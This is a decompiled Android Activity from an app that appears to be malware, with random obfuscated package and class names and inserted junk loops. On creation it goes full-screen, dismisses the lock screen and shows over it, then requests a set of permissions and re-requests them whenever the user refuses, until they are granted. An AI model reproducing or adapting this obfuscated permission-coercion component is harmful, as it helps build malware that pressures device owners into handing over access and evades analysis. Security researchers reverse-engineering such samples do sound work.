package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import androidx.core.app.C0004a;
import androidx.core.content.C0025a;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
/* loaded from: classes.dex */
public class itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29 extends Activity {
    /* renamed from: a */
    public static boolean m100a(Context context, String... strArr) {
        if (context == null || strArr == null) {
            return true;
        }
        for (String str : strArr) {
            if (C0025a.m312a(context, str) != 0) {
                return false;
            }
        }
        return true;
    }

    @Override // android.app.Activity
    public void finish() {
        C0045d.f183X = Boolean.FALSE;
        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.FALSE;
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        try {
            try {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        getWindow().addFlags(1024);
                        ((KeyguardManager) getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard(this, null);
                        setShowWhenLocked(true);
                    } else {
                        getWindow().setFlags(1024, 6816768);
                    }
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
                getWindow().setFlags(1024, 6816768);
            }
        } catch (Exception unused3) {
            getWindow().setFlags(1024, 1024);
        }
        try {
            String[] m220h = C0045d.m220h(this);
            if (m100a(this, m220h)) {
                return;
            }
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f314j = Boolean.TRUE;
            C0004a.m391d(this, m220h, 151);
        } catch (Exception unused4) {
            Boolean bool2 = Boolean.TRUE;
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
        }
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 151) {
            return;
        }
        if (iArr.length <= 0 || iArr[0] != 0) {
            C0004a.m391d(this, C0045d.m220h(this), 151);
            return;
        }
        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f314j = Boolean.FALSE;
        finish();
    }
}
